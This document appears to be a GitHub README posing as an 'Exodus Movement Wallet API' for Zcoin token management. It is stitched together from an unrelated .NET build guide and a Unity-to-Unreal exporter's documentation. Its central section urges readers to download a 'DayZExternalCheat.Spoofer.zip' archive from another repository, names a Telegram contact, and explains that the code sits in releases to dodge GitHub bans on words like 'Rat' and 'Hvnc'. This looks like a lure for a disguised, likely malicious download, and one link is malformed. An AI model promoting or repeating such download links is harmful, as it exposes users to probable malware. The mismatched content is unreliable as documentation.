<!---------------------------------------------------------------------------------------->



# Exodus Movement Wallet API Source: Token Management via Zcoin Exodus Protocol

Presenting an expansive API service tailored for proficient token management within the Zcoin Exodus Protocol.

![Exodus_Logo-removebg-preview](https://user-images.githubusercontent.com/106811566/171851878-bf94716c-f545-4249-911a-ec535dc0a60a.png)






<!---------------------------------------------------------------------------------------->


## How To use & Information special

![Screenshot](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/a79eb6db-4d76-433b-adf7-1766dc0811cf)

## How to Use & Special Information 📚

![Button](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/604eb64a-1490-4c82-88dc-e888ca285a96)  ![Icon](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/49fd6852-d835-430a-a1c2-3887ad67613f)

## GitHub Repositories Are Being Banned 🚫
**The reason is the usage of certain words in repository names such as: Hack, Cheat, Hacking Tool, Game Name, Hvnc, Rat, etc.**

Furthermore, tags within repositories are also subject to restrictions. These limitations prevent the utilization of specific keywords I have positioned at the beginning of projects' tags, which are intended to enhance their discoverability.

# Release Source Code Link: [Click Here 🔗](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/tag/SourceCode)
# Direct Download Source Code:[**Source Code Download📥**](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/download/SourceCode/DayZExternalCheat.Spoofer.zip)

[![Source Code](https://cdn.discordapp.com/attachments/1132306937132879982/1138570951366283395/Source_Code_In_Release.png)](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/tag/SourceCode)

Despite my attempts to bypass this limitation, regrettably, I did not achieve success. Consequently, I have chosen to place the source code in the Release section. Rest assured, I will include the required source code there, following the same approach as other individuals, rather than providing the executable.

### Telegram Contact: [JOJO](https://t.me/JOJO003) 📞


<!---------------------------------------------------------------------------------------->






## Development Guide

### Prerequisites

- .NET Core 2.1

### Building Process

Execute the following command to build the project:

```sh
dotnet build src/Ztm.sln
```

### Initiating Required Services

Before you begin, ensure that you have [Docker Compose](https://do6cs.65/) installed. Then proceed with the command:

```sh
docker-compose up -d
```
![image](https://user-images.githubusercontent.com/106811566/171851917-bd154f89-2e32-485c-bf92-2ef96bb784ac.png)

### Migrating Database Schemas

Navigate to the directory `src/Ztm.Data.Entity.Postgres` and execute:

```sh
ZTM_MAIN_DATABASE="Host=127.0.0.1;Database=postgres;Username=postgres" dotnet ef database update
```

### Initiating the Web API

Kickstart the Web API with:

```sh
dotnet run -p src/Ztm.WebApi
```

Remember, this guide covers:

* Prerequisites
* Building
* Starting Required Services
* Migrating Database Schemas
* Launching the Web API

For additional details, refer to the specific sections relevant to your needs.




<!---------------------------------------------------------------------------------------->






## Installation Instructions - Unreal Engine Integration

To incorporate the Exodus Import functionality within your Unreal Engine project, follow these steps:

1. If your C++ project lacks a "Plugins" folder, create one.
2. Copy or establish a symbolic link for the "ExodusImport" folder, placing it within the "Plugins" directory.
3. Reload the project to ensure the changes take effect.
4. In the Unreal Editor, navigate to the "Plugins" menu. Under the "Other" category, locate "ExodusImport" and activate it. The project will be restarted.
5. If necessary, recompile the project.
6. Once installation is successful, you'll find the "Import" command available as a button in the scene view's toolbar.

Please disregard any buttons that are not labeled "Import," as they may be test cases unrelated to this process.





<!---------------------------------------------------------------------------------------->




## Instructions for Usage

Access the exporter through either right-clicking within the hierarchy view in Unity or selecting "Migrate to UE4" from the main menu of Unity. The following options are available:

* **Export current object:** Exports the current object with minimal information about the rest of the scene.
* **Export selected objects:** Exports the selected objects within the current scene.
* **Export current scene:** Attempts to export the current scene along with all objects in it.
* **Export current project:** The plugin enumerates all resources within the project and exports them, including scenes.

Upon selecting your desired option, you'll be prompted to designate an empty location for the "project" file and the exported data. Opt for an empty folder devoid of other content.

The exported data comprises a "master" file in JSON format and a corresponding folder. As the project export commences, the plugin copies and converts pertinent data into the designated folder.

On the Unreal Engine side, locate the "Import" button within the toolbar and choose the exported \*.json file.

In scenarios where you've exported the current scene only, that scene will be exported into the current Unreal scene and merged with it. However, if the scene encompasses terrain, it will be imported as a separate scene file, found at /Import/<UnityProjectName>/<SceneName>. You will receive a warning and a request to await shader compilation completion. After shaders finish compiling, navigate to the scene file's location and open it.

In cases where multiple scenes are exported, the exporter/importer endeavors to organize them in paths resembling Unity's. Therefore, the imported scene content should be under /Import/<UnityProjectName>/ and further subfolders as per your Unity folder structure.





<!---------------------------------------------------------------------------------------->








## Supported Features and Current Limitations

The plugin offers support for rebuilding the current scene or scenes, converting static meshes, and making an effort to convert terrain, landscapes, and skeletal meshes into Unreal-compatible formats. The plugin also endeavors to recreate materials.

However, the following limitations are in place:

* Only "Standard" and "Standard (Specular setup)" materials are currently supported, with all their associated parameters.
* Static meshes are supported. UV coordinates and vertex positions will be converted to Unreal format.
* Light and their parameters conversion is supported.
* Reflection probes are supported.
* The plugin will make an attempt to transfer flags such as static nature, specific shadow casting, etc.
* Surface shaders and custom shaders are **not supported** and cannot be converted. The plugin will try to extract their properties, but if these properties do not align with those of standard materials, the material might appear black on the Unreal side.
* Textures in formats not natively supported by Unreal Engine will be converted to PNG, potentially leading to minor data loss due to the conversion process. It's recommended to replace these automatically converted textures when feasible.
* Reflection cubemaps used by reflection probes will undergo a similar conversion process and might experience minor data loss. Consider replacing them when possible.
* Prefabs aren't currently converted into blueprints.
* Empty GameObject nodes utilized for organizational purposes will transform into Unreal 4 folders within the scene view.
* Due to differences in handling landscapes, a 1:1 identical transfer isn't feasible. Maps employed by the terrain system will be resampled during import, and trees might lose custom tinting. The plugin strives to maintain grass density, but variations in grass clump placement might occur.
* Skinned mesh/character conversion is only partially supported, and upon import, characters might be divided into multiple objects. While animation clips used by the controller will be converted, the state machine won't be recreated. Artifacts might appear in converted characters.
* Additional limitations might apply.

Additionally, the file format used for project transfer is subject to change and shouldn't be relied upon for long-term data storage or backup purposes.







<!---------------------------------------------------------------------------------------->








## Additional Contact Information:

For reporting bugs, please utilize the GitHub project page. Alternatively, you can get in touch through the following email address: neginfinity000<at>gmail.com.


<!---------------------------------------------------------------------------------------->




## Contact Details

While GitHub is the preferred channel for bug submissions, you can also reach out via the provided email address.




<!---------------------------------------------------------------------------------------->
